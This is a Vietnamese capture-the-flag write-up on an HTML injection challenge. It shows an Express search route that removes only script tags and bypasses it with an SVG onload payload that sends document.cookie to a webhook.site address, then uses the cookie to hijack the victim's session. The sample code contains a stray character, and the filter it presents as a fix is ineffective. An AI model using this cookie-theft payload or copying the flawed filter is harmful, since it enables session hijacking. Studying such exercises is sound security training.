# HTML Injection 2

# Thử thách về lỗi bảo mật HTML Injection

# Mục tiêu: Đọc note của nạn nhân
# Cách giải quyết:
đây là một lỗi bảo mật HTML Injection, có thể được khai thác để thực hiện tấn công XSS (Cross-Site Scripting). Để giải quyết vấn đề này, ta cần lọc bỏ các thẻ `<script>` trong chuỗi tìm kiếm.


Code lv2:
```
router.get('/search', function (req, res, next) {
    // Sử dụng regex để replace <script> tag
    // Flag g: dùng để match tất cả ký tự trong mẫu tìm kiếm
    // Flag i: case insensitve không phân biệt chữ hoa chữ thường
    sanitized_q = req.query.q.replace(/<script>|<\/script>/gi, "");
    html = 'Your search - <b>' + sani<tized_q + '</b> - did not match any notes.<br><br>'
    res.send(html);
});
```
- Tìm kiếm với từ khóa: `<script>alert('XSS')</script>`
- Kết quả trả về: `Your search - <b>alert('XSS')</b> - did not match any notes.<br><br>.` 
- Kết quả trả về không có thẻ `<script>` nên không bị lỗi XSS   

Playload test
```
<svg/onload=fetch('https://webhook.site/3a6cea0c-0c4b-4528-a54e-421553192587?data='+document.cookie)>
```

# Kết quả trả về:
đã lấy được cookie của nạn nhân.ß
<img src='./img/Screenshot 2025-08-10 at 21.12.19.png'>

Playload hoàn chỉnh:
```
https://url/search?q=%3Csvg%2Fonload%3Dfetch%28%27https%3A%2F%2Fwebhook.site%2F3a6cea0c-0c4b-4528-a54e-421553192587%3Fdata%3D%27%2Bdocument.cookie%29%3E
```
# Kết quả:
- Cookie của nạn nhân đã được gửi đến `webhook`
- Lây được cookie của nạn nhân, ta có thể sử dụng để truy cập vào tài khoản của họ hoặc thực hiện các hành động khác trên trang web.
- Vào developer tools của trình duyệt, vào tab Application, chọn Cookies, ta có thể thấy cookie thay cookie của nạn nhân đã được gửi đến webhook.
- f5 để nhân cookie mới nhất.
- Vào mục `note` của nạn nhận để xem nội dung note của nạn nhân.

<img src='./img/Screenshot 2025-08-10 at 21.57.46.png'>

Lấy được flag của nạn nhân